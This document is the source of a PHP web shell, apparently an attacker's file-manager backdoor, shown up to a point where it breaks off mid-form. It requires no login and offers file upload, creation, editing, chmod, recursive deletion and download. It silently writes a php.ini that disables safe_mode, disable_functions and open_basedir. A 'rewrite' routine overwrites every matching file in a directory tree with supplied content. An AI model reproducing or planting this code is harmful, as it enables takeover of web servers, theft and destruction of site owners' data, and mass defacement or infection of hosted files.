<!DOCTYPE html>
<html>
<head>
	<title><?= get_current_user() ?></title>
  	<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<style type="text/css">
@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
body {
  font-family: 'Ubuntu Mono', monospace;
  line-height: 1.25;
  color: #8a8a8a;
  font-weight:normal;
  font-style: normal;
}

table {
  background:#fff;
  line-height: 40px;
  border-collapse: separate;
  border-spacing: 0;
  border: 25px solid #fff;
  width: 70%;
  border-radius: 20px;
  box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
}


table tr {
    border: 1px solid red;
  }

  table th {
  padding: .625em;
  text-align: center;
}

table td {
	padding: .625em;
}

table th {
  font-size: .85em;
  letter-spacing: .1em;
  text-transform: uppercase;
}
textarea {
	padding: 12px 20px;
	width:93.5%;
	height:200px;
	resize:none;
	-moz-border-bottom-colors: none;
  	-moz-border-left-colors: none;
  	-moz-border-right-colors: none;
  	-moz-border-top-colors: none;
  	outline:none;
  	border-radius:6px;
  	border:2px solid #e8e8e8;
  	background:rgba(222,222,222,0.73);
  	color:#8a8a8a;
}
a {
	color:#8a8a8a;
	text-decoration:none;
}
input[type=submit] {
  font-family: 'Ubuntu Mono', monospace;
  outline:none;
  color:#8a8a8a;
  width:97%;
  font-weight: bold;
  padding:7px 2px;
  border-radius:6px;
  border:2px solid #e8e8e8;
  background:rgba(222,222,222,0.73);
}
input[type=text].action {
	width:96%;
	font-family: 'Ubuntu Mono', monospace;
	padding:12px;
	color:#8a8a8a;
	border-radius:7px;
	border:2px solid #e8e8e8;
	outline:none;
	background:#e8e8e8;
}
table tr:last-child {
	border-bottom:none;
}
select {
	font-family: 'Ubuntu Mono', monospace;
  outline:none;
  color:#8a8a8a;
  width:97%;
  font-weight: bold;
  padding:7px 2px;
  border-radius:6px;
  border:2px solid #e8e8e8;
  background:rgba(222,222,222,0.73);
}
td.not {
	border-bottom:none;
	padding:3px;
}
td.yes {
	border-bottom: 2px solid #e8e8e8;
}
ul.action {
	background:transparent;
	padding: 10px 10px;
    border-radius:7px;
}
li.action {
	text-align:left;
	list-style:none;
	border:1px solid #e8e8e8;
	padding:10px 20px;
}
li.action:last-child {
	border-radius:0px 0px 7px 7px;
	border-top:none;
}
li.action:first-child {
	border-radius:7px 7px 0px 0px;
}
li.action:nth-child(2) {
	border-top:none;
}
li.action:nth-child(3) {
	border-top:none;
}
li.action:nth-child(4) {
	border-top:none;
}
li.action:hover {
	background: #e8e8e8;
	cursor: pointer;
}
div.action {
	width:50%;
}
div.action_f {
	width:50%;
}
.container {
  display: block;
  position: relative;
  padding-left: 15px;
  margin-bottom: 25px;
  cursor: pointer;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

/* Hide the browser's default checkbox */
.container input {
  position: absolute;
  opacity: 0;
  cursor: pointer;
  height: 0;
  width: 0;
}

/* Create a custom checkbox */
.checkmark {
  position: absolute;
  top: 0;
  left: 0;
  height: 18px;
  width: 18px;
  border-radius:10px;
  background-color: #eee;
}
.container:hover input ~ .checkmark {
  background-color: #ccc;
}
.container input:checked ~ .checkmark {
  background-color: #2196F3;
}
.checkmark:after {
  content: "";
  position: absolute;
  display: none;
}
.container input:checked ~ .checkmark:after {
  display: block;
}
.container .checkmark:after {
  left: 6px;
  top: 2px;
  width: 3px;
  height: 8px;
  border: solid red;
  border-width: 0 3px 3px 0;
  -webkit-transform: rotate(45deg);
  -ms-transform: rotate(45deg);
  transform: rotate(45deg);
}
.alert {
  padding: 12px;
  color: red;
  opacity: 1;
  transition: opacity 0.6s;
  border-radius:7px; 
}

.alert.success {background-color: #61c765;}
.alert.failed {background-color: #ff8787;}

.closebtn {
  margin-left: 15px;
  color: red;
  font-weight: bold;
  float: right;
  font-size: 22px;
  line-height: 20px;
  cursor: pointer;
  transition: 0.3s;
}

.closebtn:hover {
  color: black;
}
span.a {
	float:left;
}
.b {
	float:right;
}
a.act {
	border-radius:7px 0px 0px 7px; 
}
a.act {
	margin-top:-9px;
	background: #e8e8e8;
	padding:3px 7px;
	border:2px solid transparent;
	border-right:2px solid transparent;
}
a.s {
	margin-top:-9px;
	border-radius:0px 7px 7px 0px;
	border:2px solid transparent;
}
select:hover,
a.s:hover, 
a.act:hover,
input[type=submit]:hover {
	border:2px solid #e87b7b;
	border-right:2px solid #e87b7b;
	cursor:pointer;
}
a.t:hover {
	background:#e87b7b;
	border:2px solid #e87b7b;
	color:#fff;
}
a.slc {
	background:#e87b7b;
	border:2px solid #e87b7b;
	color:#fff;
	pointer-events: none;
  	cursor: default;
  	text-decoration: none;
}
a.acs:hover {
	background:#e87b7b;
	border:2px solid #e87b7b;
	color:#fff;
}
a.so:hover {
	color:#e87b7b;
}
a.su:hover {
	color:#e39700;
}
textarea:focus,
input[type=text].action:focus {
	border:2px solid #e87b7b;
}
div.act {
	background: #e8e8e8;
	padding:7px;
	width:97%;
	height:60px;
	text-align:left;
	border-radius:7px;
}
div.asd {
	height:345px;
}
a.acs {
	margin-left:-12px;
	background: #e8e8e8;
	padding:3px 7px;
	border:2px solid transparent;
	border-left:2px solid #e8e8e8;
}
a.fe {
	margin-left:-12px;
	padding:3px 7px;
	border:2px solid transparent;
	border-left:2px solid #e8e8e8;
}
a.c {
	background: #e8e8e8;
	border:2px solid transparent;
	border-radius:7px;
	margin-top:-9px;
	width:70px;
	text-align: center;
}
a.l {
	margin-left:-12px;
	border-left:2px solid #e8e8e8;
}
td.mas {
	padding:0px 2px;
}
td.sup {
	width:0.1px;
}
td.lol {
	width:0.1px;
}
tr.file:last-child {
	border-bottom:none;
}
.sad {
	float:right;
}
.icon {
	width:26px;
	height:26px;
}
td.check {
	width:1px;
}
a.tool {
	font-family: 'Ubuntu Mono', monospace;
  	padding:7px 20px;
  	outline:none;
  	color:#8a8a8a;
  	border-radius:20px;
  	border:1px solid rgba(222,222,222,0.73);
  	background:rgba(222,222,222,0.73);
}
div.tool {
	margin-top:7px;
}
a.pwd {
	margin: 5px;
}
input[type=text].write {
	width:97%;
}
textarea.write {
  	width:95%;
  }
textarea.edit {

}
input[type=submit].edit {
	width:100%;
	margin-left:-7px;
}
input[type=submit].chmod {
	width:101%;
	margin-left:-7px;
}
input[type=submit].rename {
	width:101%;
	margin-left:-7px;
}
img.img {
  max-width: 100%;
  height: auto;
  border-radius:10px;
}
.upload-btn-wrapper {
  position: relative;
  overflow: hidden;
  display: inline-block;
  margin-top:12px;
}

.btn {
  border:2px solid transparent;
  color: #8a8a8a;
  background-color: rgba(222,222,222,0.73);
  padding: 6px 22px;
  border-radius: 7px;
  font-size: 15px;
  font-weight: bold;
}

.upload-btn-wrapper input[type=file] {
  font-size: 100px;
  position: absolute;
  left: 0;
  top: 0;
  opacity: 0;
}
@media screen and (max-width: 600px) {
  table {
  margin: 0;
  background:#fff;
  padding:0px;
  width: 100%;
  border: 1px solid #fff;
  box-shadow:none;
}
a.tool {
	font-family: 'Ubuntu Mono', monospace;
  	padding:5px 15px;
  	outline:none;
  	color:#8a8a8a;
  	font-size:12.8px;
  	border-radius:20px;
  	border:1px solid rgba(222,222,222,0.73);
  	background:rgba(222,222,222,0.73);
}
td.not {
	padding:0px;
	padding:3px;
}
.icon {
	width:20px;
	height:20px;
}
select {
	padding:3px;
}
.strong {
	font-size:10px;
}
div.act {
	width:95.5%;
}
div.action {
	width:100%;
}
div.action_f {
	width:100%;
}
input[type=text].action {
	width:91%;
}
input[type=submit] {
	width:97%;
}
.k {
	float:right;
	font-size:12px;
}
  
  table thead {
    border: none;
    clip: rect(0 0 0 0);
    height: 1px;
    margin: -1px;
    padding: 0;
    width: 1px;
  }
  
  td.perms {
  	width:70px;
  }
  table tr {
    border-radius:10px;
  }
  
  table td {
    font-size: .9em;
  }
  a.fo {
  	font-size:10px;
  }
  
  textarea {
	padding: 12px 20px;
	width:86%;
  }
  th.pol, td.pol {
  	display:none;
  }
  a.si {
  	float:right;
  }
  .sa {
  	font-size:12px;
  }
  a.c, a.s, a.act {
  	margin-top:-4px;
  }
  a.z {
  	margin-left:10px;
  }
  td.cp; {
  	width:10px;
  }
  input[type=text] {
  	width:88%;
  }
  textarea.write {
  	width:86%;
  }
  input[type=submit].edit {
	width:102%;
	margin-left:-05px;
  }
  textarea.edit {
  	font-size:10px;
  }
  input[type=submit].rename {
	width:102%;
	margin-left:-05px;
  }
  input[type=submit].chmod {
	width:102%;
	margin-left:-05px;
  }
  input[type=submit].upload {
	width:102%;
	margin-left:-05px;
  }
  td.upload {
  	width:50%;
  }
</style>
<body>
<center>
<table>
<thead>
    </tr>
    <tr>
    	<td colspan="5" class="not">
    		<center>
    			<a class="tool" href="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']?>">HOME</a>
    			<a class="tool" href="?path=<?=cwd()?>&info">INFO</a>
				<a class="tool" href="?path=<?=cwd()?>&upload">UPLOAD</a>
    		</center>
    	</td>
    </tr>
    <tr>
    	<td colspan="5">
    		<center>
    			<span class="strong"><?= pwd() ?> ( <?= permission(cwd(), perms(cwd())) ?> )</span>
    		</center>
    	</td>
    </tr>
</thead>
<?php
error_reporting(0);
function cwd() {
  if (isset($_GET['path'])) {
    $cwd = @str_replace('\\', '/', $_GET['path']);
    @chdir($cwd);
  } else {
    $cwd = @str_replace('\\', '/', @getcwd());
  } return $cwd;
}
function pwd() {
	$pwd = explode('/', cwd());
	foreach ($pwd as $key => $value) {
		print("<a href='?path=");
		for ($i=0; $i <= $key ; $i++) { 
			print($pwd[$i]);
			if ($i != $key) {
				print("/");
			}
		} print("'>{$value}</a>/");
	}
}
function perms($file) {
$perms = @fileperms($file);

switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info = 's';
        break;
    case 0xA000: // symbolic link
        $info = 'l';
        break;
    case 0x8000: // regular
        $info = 'r';
        break;
    case 0x6000: // block special
        $info = 'b';
        break;
    case 0x4000: // directory
        $info = 'd';
        break;
    case 0x2000: // character special
        $info = 'c';
        break;
    case 0x1000: // FIFO pipe
        $info = 'p';
        break;
    default: // unknown
        $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;
}
function permission($filename, $perms, $po=false) {
  if (is_writable($filename)) {
    ?> <font color="green"><?php print $perms ?></font> <?php
  } else {
    ?> <font color="red"><?php print $perms ?></font> <?php
  }
}
function size($file) {
    $bytes = filesize($file);

    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}
makefile($_SERVER['DOCUMENT_ROOT']."/php.ini", "safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF ");
if (isset($_GET['info'])) {
	?>
	<tr>
		<td style="width:150px;">
			Sistem : <span style="color:green;"><?= php_uname() ?></span> <br>
			Disable Function : <?= (!empty(ini_get("disable_functions"))) ? "<font color=red>".ini_get("disable_functions")."</font>" : "<font color=green>NONE</font>" ?>
		</td>
	</tr>
	<?php
	exit();
}
if (isset($_GET['upload'])) {
	?>
	<tr>
		<td class="upload">
			<form method="post" enctype="multipart/form-data">
				<div class="upload-btn-wrapper">
					<button class="btn">Choose file</button>
					<input type="file" name="file[]" multiple>
				</div>
		</td>
		<td>
			<input class="upload" type="submit" name="submit" value="UPLOAD">
			</form>
		</td>
	</tr>
	<?php
	if (isset($_POST['submit'])) {
		$file = count($_FILES['file']['tmp_name']);
		for ($i=0; $i < $file ; $i++) { 
			if (copy($_FILES['file']['tmp_name'][$i] , cwd().'/'.$_FILES['file']['name'][$i])) {
				alert("success", "uploaded <u>{$_FILES['file']['name'][$i]}</u>");
			} else {
				alert("failed");
			}
		}
	}
	exit();
}
if (@$_GET['action'] == 'path') {
	?>
	<tr>
		<td class="not">
			<center>
				<div class="action">
					<input class="action" type="text" name="" value="<?=cwd()?>" readonly>
					<ul class="action">
						<li class="action">
							<a href="?path=<?=cwd()?>&makefile">Make File</a>
						</li>
						<li class="action">
							<a href="?path=<?=cwd()?>&makedir">Make Folder</a>
						</li>
					</ul>
				</div>
			</center>
		</td>
	</tr>
	<?php
	exit();
}
if (isset($_GET['action'])) {
	$file = $_GET['file'];
	?>
	<?php
	$ext = pathinfo($file, PATHINFO_EXTENSION);
	switch ($file) {
		case filetype($file) == 'file':
			if (is_file($file)) {
				?>
				<tr>
					<td class="not mas sup">
						<span class="a">
							Filename
						</span>
					</td>
					</div>
					<td class="not mas lol"><center>:</center></td>
					<td class="not mas">
						<span><u><?=permission($file,basename($file))?></u></span>
					</td>
				</tr>
				<tr>
					<td class="not mas">
						<span class="a">
							Size 
						</span>
					</td>
					<td class="not mas lol"><center>:</center></td>
					<td class="not mas">
							<?=size($file)?>
					</td>
				</tr>
				<tr>
					<td class="not mas">
						<span class="a">
							Type
						</span>
					</td>
					<td class="not mas lol"><center>:</center></td>
					<td class="not mas">
							<?=get_type($file)?>
					</td>
				</tr>
				<tr>
					<td class="not" colspan="3">
						<center>
							<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
							<a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
							<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
							<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
							<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
							<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
						</center>
					</td>
				</tr>
				<tr>
					<td class="not" colspan="3">
						<textarea class="edit" readonly><?php print htmlspecialchars(file_get_contents(basename($file))) ?></textarea>
					</td>
				</tr>
			<?php
			}
			break;
			case filetype($file) == 'dir':
				if (is_dir($file)) {
					?>
					<tr>
						<td class="not mas sup">
							<span class="a">
								Filename
							</span>
						</td>
					</div>
					<td class="not mas lol"><center>:</center></td>
					<td class="not mas">
						<span><u><?=permission(cwd(),basename($file))?></u></span>
					</td>
				</tr>
				<tr>
					<td class="not mas">
						<span class="a">
							Size 
						</span>
					</td>
					<td class="not mas lol"><center>:</center></td>
					<td class="not mas">
						--
					</td>
				</tr>
				<tr>
					<td class="not mas">
						<span class="a">Type</span>
					</td>
					<td class="not mas lol"><center>:</center></td>
					<td class="not mas">
						<?=filetype($file)?>
					</td>
				</tr>
					<tr>
						<td class="not" colspan="3">
						<center>
							<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
							<a class="fo act t" href="?path=<?=$file?>">OPEN</a>
							<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
							<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
							<a class="fo s act t l" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
					<?php
				}
			break;
		}
		exit();
}
if (@$_GET['act'] == 'img') {
	$file = $_GET['file'];
	?>
	<tr>
		<td class="not mas sup">
			<span class="a">
				Filename
			</span>
		</td>
		</div>
		<td class="not mas lol"><center>:</center></td>
		<td class="not mas">
			<span><u><?=permission(cwd(),basename($file))?></u></span>
		</td>
	</tr>
	<tr>
		<td class="not mas">
			<span class="a">
				Size 
			</span>
		</td>
		<td class="not mas lol"><center>:</center></td>
		<td class="not mas">
			<?=size($file)?>
		</td>
	</tr>
	<tr>
		<td class="not mas">
			<span class="a">
				Type
			</span>
		</td>
		<td class="not mas lol"><center>:</center></td>
		<td class="not mas">
			<?=get_type($file)?>
		</td>
	</tr>
	<tr>
		<td class="not"></td>
		<td class="not"></td>
		<td class="not">
			<?php
			list($width, $height, $type, $attr) = getimagesize(basename($file));
			echo "" .$attr. "";
			$arr = array('h' => $height, 'w' => $width, 'a' => $attr);
			?>
		</td>
	</tr>
	<tr>
		<td class="not" colspan="3">
			<center>
				<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
				<a class="fo act t" href="?path=<?=cwd()?>&action=img&file=<?=$file?>">PREVIEW</a>
				<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
				<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
				<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
				<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
			</center>
		</td>
	</tr>
	<tr>
		<td class="not" colspan="3">
			<center>
				<img class="img" src="http://<?=$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd()).'/'.basename($file)?>">
			</center>
		</td>
	</tr>
	<?php
	exit();
}
if (@$_GET['act'] == 'mp3') {
	$file = $_GET['file'];
	?>
	<tr>
		<td class="not mas sup">
			<span class="a">
				Filename
			</span>
		</td>
		</div>
		<td class="not mas lol"><center>:</center></td>
		<td class="not mas">
			<span><u><?=permission(cwd(),basename($file))?></u></span>
		</td>
	</tr>
	<tr>
		<td class="not mas">
			<span class="a">
				Size 
			</span>
		</td>
		<td class="not mas lol"><center>:</center></td>
		<td class="not mas">
			<?=size($file)?>
		</td>
	</tr>
	<tr>
		<td class="not mas">
			<span class="a">
				Type
			</span>
		</td>
		<td class="not mas lol"><center>:</center></td>
		<td class="not mas">
			<?=get_type($file)?>
		</td>
	</tr>
	<tr>
		<td class="not" colspan="3">
			<center>
				<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
				<a class="fo act t" href="?path=<?=cwd()?>&action=mp3&file=<?=$file?>">PREVIEW</a>
				<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
				<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
				<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
				<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
			</center>
		</td>
	</tr>
	<tr>
		<td class="not" colspan="3">
			<center>
				<audio controls>
					<source src="http://<?=$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd()).'/'.basename($file)?>" type="audio/mp3">
				</audio>
			</center>
		</td>
	</tr>
	<?php
	exit();
}
if (isset($_GET['rewrite'])) {
	?>
	<form method="post">
		<tr>
			<td class="not">
				<input class="action write" type="text" name="dir" value="<?=cwd()?>">
			</td>
		</tr>
		<tr>
			<td class="not">
				<input class="action write" type="text" name="type" placeholder="type ext : php, if you want execute all please empty this">
			</td>
		</tr>
		<tr>
			<td class="not">
				<textarea class="write" name="text" placeholder="put your script or text"></textarea>
			</td>
		</tr>
		<tr>
			<td class="not">
				<input style="width:100%;" type="submit" name="rewrite" value="REWRITE">
			</td>
		</tr>
	</form>
	<?php
	if (isset($_POST['rewrite'])) {
		rewrite($_POST['dir'], $_POST['type'], $_POST['text']);
	}
	exit();
}
function rewrite($dir, $type, $text) {
    if(is_writable($dir)) {
        $getfile = scandir($dir);
        foreach($getfile as $file) {
            $path = $dir.DIRECTORY_SEPARATOR.$file;
            if($file === '.' || filetype($path) == 'file') {
                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
                	alert("success", "rewrite ".cwd().'/'."{$file}");
                	file_put_contents($path, $text);
                endif;
            } elseif($file === '..' || filetype($path) == 'file') {
                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
                    alert("success", "rewrite ".cwd().'/'."{$file}");
                file_put_contents($path, $text);
                endif;
            } else {
                if(is_dir($path)) {
                    if(is_writable($path)) {
                        @file_put_contents($path, $text);
                        rewrite($path,$type,$text);
                    }
                }
            }
        }
    }
}
function download($file) {
  @ob_clean();
	header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
function unzip($source, $destination) {
	$zip = new ZipArchive();
	if ($zip->open($source) === true) {
		$zip->extractTo($destination);
		$zip->close();
	}
}
function zip($source, $destination) {
	if (extension_loaded('zip')) {
		if (file_exists($source)) {
			$zip = new ZipArchive();
			if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
				if (is_dir($source)) {
					$iterator = new RecursiveDirectoryIterator($source);
					// skip dot files while iterating 
					$iterator->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
					$files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST);
					foreach ($files as $file) {
						$root = $_SERVER['DOCUMENT_ROOT'];
						if (is_dir($file)) {
							$zip->addEmptyDir(str_replace($root, '', $file . '/'));
						} else if (is_file($file)) {
							$zip->addFromString(str_replace($root, '',  $file), file_get_contents($file));
						}
					}
				} else if (is_file($source)) {
					$zip->addFromString(basename($source), file_get_contents($source));
				}
			}
			return $zip->close();
		}
	}
	return false;
}
function get_type($filename) {
    $idx = explode( '.', $filename );
    $count_explode = count($idx);
    $idx = strtolower($idx[$count_explode-1]);
    $mimet = array( 
        'txt' 	=> 'text/plain',
        'htm' 	=> 'text/html',
        'html' 	=> 'text/html',
        'php' 	=> 'text/php',
        'php1' 	=> 'text/php',
        'php2' 	=> 'text/php',
        'phtml' => 'text/php',
        'css' 	=> 'text/css',
        'ttf' 	=> 'font/sfnt',
        'js' 	=> 'application/javascript',
        'json' 	=> 'application/json',
        'xml' 	=> 'application/xml',
        'swf' 	=> 'application/x-shockwave-flash',
        'flv' 	=> 'video/x-flv',
        'png' 	=> 'image/png',
        'jpe' 	=> 'image/jpeg',
        'jpeg' 	=> 'image/jpeg',
        'jpg' 	=> 'image/jpeg',
        'gif' 	=> 'image/gif',
        'bmp' 	=> 'image/bmp',
        'ico' 	=> 'image/vnd.microsoft.icon',
        'tiff' 	=> 'image/tiff',
        'tif' 	=> 'image/tiff',
        'svg' 	=> 'image/svg+xml',
        'svgz' 	=> 'image/svg+xml',
        'zip' 	=> 'application/zip',
        'rar' 	=> 'application/x-rar-compressed',
        'exe' 	=> 'application/x-msdownload',
        'msi' 	=> 'application/x-msdownload',
        'cab' 	=> 'application/vnd.ms-cab-compressed',
        'mp3' 	=> 'audio/mpeg',
        'qt' 	=> 'video/quicktime',
        'mov' 	=> 'video/quicktime',
        'pdf' 	=> 'application/pdf',
        'psd' 	=> 'image/vnd.adobe.photoshop',
        'ai' 	=> 'application/postscript',
        'eps' 	=> 'application/postscript',
        'ps' 	=> 'application/postscript',
        'doc' 	=> 'application/msword',
        'rtf' 	=> 'application/rtf',
        'xls' 	=> 'application/vnd.ms-excel',
        'ppt' 	=> 'application/vnd.ms-powerpoint',
        'docx' 	=> 'application/msword',
        'xlsx' 	=> 'application/vnd.ms-excel',
        'pptx' 	=> 'application/vnd.ms-powerpoint',
        'odt' 	=> 'application/vnd.oasis.opendocument.text',
        'ods' 	=> 'application/vnd.oasis.opendocument.spreadsheet',
    );

    if (isset( $mimet[$idx] )) {
     return $mimet[$idx];
    } else {
     return 'application/octet-stream';
    }
 }
function alert($type, $msg) {
	?>
	<tr>
		<td class="not" colspan="4">
			<div class="alert <?=$type?>">
				<span class="closebtn" onclick="window.location='?path=<?=cwd()?>';">&times;</span>
				<strong><?=$type?>!</strong> <?=$msg?>
			</div>
		</td>
	</tr>
	<?php
}
function makedir($dirname) {
    return is_dir($dirname) || mkdir($dirname, "0777", true);
}
function backup($filename) {
	$backup = $filename.'.back';
	copy($filename, $backup);
}
function makefile($file, $text) {
	$handle = fopen(cwd().'/'.$file, "w");
	fwrite($handle, $text);
	fclose($handle);
}
function changemode($file, $mode) {
	return chmod($file, $mode);
}
function delete($filename) {
  if (@is_dir($filename)) {
    $scandir = @scandir($filename);
    foreach ($scandir as $object) {
      if ($object != '.' && $object != '..') {
        if (@is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
          @delete($filename.DIRECTORY_SEPARATOR.$object);
        } else {
          @unlink($filename.DIRECTORY_SEPARATOR.$object);
        }
      }
    } if (@rmdir($filename)) {
      return true;
    } else {
      return false;
    }
  } else {
    if (@unlink($filename)) {
      return true;
    } else {
      return false;
    }
  }
}
function renames($file, $newname) {
	return rename($file, $newname);
}
function edit($file, $text) {
	$handle = fopen($file, "w");
	fwrite($handle, $text);
	fclose($handle);
}
if(isset($_GET['file']) && ($_GET['file'] != '') && (isset($_GET['download']))) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
if (isset($_GET['makedir'])) {
	if (isset($_POST['submit'])) {
		if (makedir($_POST['dir'])) {
			?>
			<script type="text/javascript">window.location='?path=<?=cwd()?>'</script>
			<?php
		} else {
			$alert = "failed";
		}
	}
	?>
	<form method="post">
		<tr>
			<td class="not">
				<center>
					<div class="action">
						<?=@$alert?><br><br>
						<input class="action" type="text" name="dir" value="<?=cwd().'/'?>newfolder"><br><br>
						<input style="width:100%;" type="submit" name="submit">
					</div>
				</center>
			</td>
		</tr>
	</form>
	<?php
	exit();
}
if (isset($_GET['makefile'])) {
	if (isset($_POST['submit'])) {
		if (makefile($_POST['file'], $_POST['text'])) {
			$alert = alert("failed", "making file <u>".$_POST['file']."</u>");
		} else {
			$alert = alert("success", "making file <u>".$_POST['file']."</u>");
		}
	}
	?>
	<form method="post">
		<tr>
			<td>
				<input class="action" type="text" name="file" placeholder="filename.php">
			</td>
		</tr>
		<tr>
			<td>
				<textarea class="edit" name="text" placeholder="put your script or text"></textarea>
			</td>
		</tr>
		<tr>
			<td>
				<input class="edit" type="submit" name="submit">
			</td>
		</tr>
	</form>
	<?php
	exit();
}
if (isset($_GET['chmod'])) {
	$file = $_GET['file'];
	if (isset($_POST['submit'])) {
		if (changemode($file, $_POST['mode'])) {
			alert('success', 'change mode to '.$_POST['mode'].'');
		} else {
			alert("failed");
		}
	}
	?>
	<form method="post">
		<tr>
			<td class="not mas sup">
				<span class="a">
					Filename
				</span>
			</td>
			<td class="not mas lol"><center>:</center></td>
			<td class="not mas">
				<span><u><?=permission(cwd(),basename($file))?></u></span>
			</td>
		</tr>
		<tr>
			<td class="not mas">
				<span class="a">
					Size 
				</span>
			</td>
			<td class="not mas lol"><center>:</center></td>
			<td class="not mas">
				<?=size($file)?>
			</td>
		</tr>
		<tr>
			<td class="not mas">
				<span class="a">
					Type
				</span>
			</td>
			<td class="not mas lol"><center>:</center></td>
			<td class="not mas">
				<?=get_type($file)?>
			</td>
		</tr>
		<tr>
			<td class="not" colspan="3">
				<center>
					<a class="fo act acs c" href="?path=<?=cwd()?>" disable='disabled'>FILES</a>
					<?php
					$ext = pathinfo($file, PATHINFO_EXTENSION);
					switch ($ext) {
						case filetype($file) == 'file':
							if (is_dir($file)) {
								?>
								<a class="fo act t" href="?path=<?=$file?>">OPEN</a>
								<a class="fo acs fe" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
								<a class="fo slc fe" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
								<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
								<?php
							} elseif (is_file($file)) {
								?>
								<a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
								<a class="fo acs fe" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
								<a class="fo slc fe" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
								<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
								<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
								<?php
							}
							break;
					}
					?>
				</center>
			</td>
		</tr>
		<tr>
			<td class="not" colspan="3">
				<input class="action" type="text" name="mode" value="<?=substr(sprintf("%o", fileperms($file)), -4)?>">
			</td>
		</tr>
		<tr>
			<td colspan="3">
				<input class="chmod" type="submit" name="submit" value="CHANGE">
			</td>
		</tr>
	</form>
	<?php
	exit();
}
if (isset($_GET['delete'])) {
	$file = $_GET['file'];
	if (delete($file)) {
		@header("Location : ?path=".cwd()."");
	}
}
if (isset($_GET['rename'])) {
	$file = $_GET['file'];
	if (isset($_POST['submit'])) {
		if (renames($file, $_POST['newname'])) {
			?>
			<script type="text/javascript">window.location='?path=<?=cwd()?>'</script>
			<?php
		} else {
			$alert = alert("failed", "rename");
		}
	}
	?>
	<form method="post">
		<tr>
